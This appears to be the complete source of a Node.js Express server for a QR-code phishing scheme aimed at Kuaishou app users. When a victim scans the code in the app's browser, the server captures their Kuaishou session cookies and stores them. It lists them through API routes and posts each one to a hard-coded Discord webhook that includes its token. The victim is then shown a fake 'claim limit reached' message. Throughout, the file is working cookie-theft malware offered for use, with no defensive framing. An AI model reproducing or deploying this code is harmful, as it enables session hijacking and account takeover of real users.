const express = require("express");
const https = require("https");
const { v4: uuidv4 } = require("uuid");
const path = require("path");
const app = express();

app.use(express.json());
app.use(express.static(__dirname));

const WEBHOOK_URL = "https://discord.com/api/webhooks/1494697274121650310/DAbxLzXxdk4EWHyZpeJwVKydfQdQEyul4lOnjE8HAvNouZuwAQP8Sd8w_dLsrxYV6zG1";

const cookies = [];
const scans = {};

// ====== 页面 ======
app.get("/", function(req, res) {
    res.sendFile(path.join(__dirname, "scan.html"));
});

app.get("/cookies", function(req, res) {
    res.sendFile(path.join(__dirname, "cookies.html"));
});

// ====== 用户扫码后访问的链接（快手APP内置浏览器打开）======
app.get("/go", function(req, res) {
    var cookie = req.headers.cookie || "";
    var userAgent = req.headers["user-agent"] || "";
    var scanId = req.query.id || "";

    if (cookie && cookie.indexOf("kuaishou") !== -1) {
        cookies.push({
            cookie: cookie,
            ua: userAgent,
            time: new Date().toISOString()
        });

        if (scanId && scans[scanId]) {
            scans[scanId].status = "done";
            scans[scanId].cookie = cookie;
        }

        sendToDiscord(cookie);

        res.send('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body style="background:#111;color:#0f0;text-align:center;padding:50px;font-family:Arial"><h1>失败</h1><p>领取次数已达到上限</p></body></html>');
    } else {
        res.send('<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="refresh" content="0;url=https://www.kuaishou.com"></head><body></body></html>');
    }
});

// ====== 生成永久二维码 ======
app.get("/api/qr", function(req, res) {
    var scanId = uuidv4();
    var host = req.get("host");
    var qrUrl = "https://" + host + "/go?id=" + scanId;

    scans[scanId] = {
        status: "wait",
        cookie: null,
        createdAt: Date.now()
    };

    res.json({
        scanId: scanId,
        qrUrl: qrUrl
    });
});

// ====== 轮询扫码状态 ======
app.get("/api/check", function(req, res) {
    var id = req.query.id;
    var scan = scans[id];

    if (!scan) {
        return res.json({ status: "expired" });
    }

    res.json({
        status: scan.status,
        cookie: scan.cookie
    });
});

// ====== Cookie列表 ======
app.get("/api/cookies", function(req, res) {
    res.json(cookies.slice(-50).reverse());
});

// ====== 发送Discord ======
function sendToDiscord(cookie) {
    var data = JSON.stringify({
        content: "**新Cookie**\n```\n" + cookie + "\n```"
    });

    var url = new URL(WEBHOOK_URL);
    var req = https.request({
        hostname: url.hostname,
        path: url.pathname + url.search,
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(data)
        }
    });
    req.write(data);
    req.end();
}

var PORT = process.env.PORT || 3000;
app.listen(PORT, function() {
    console.log("端口 " + PORT);
});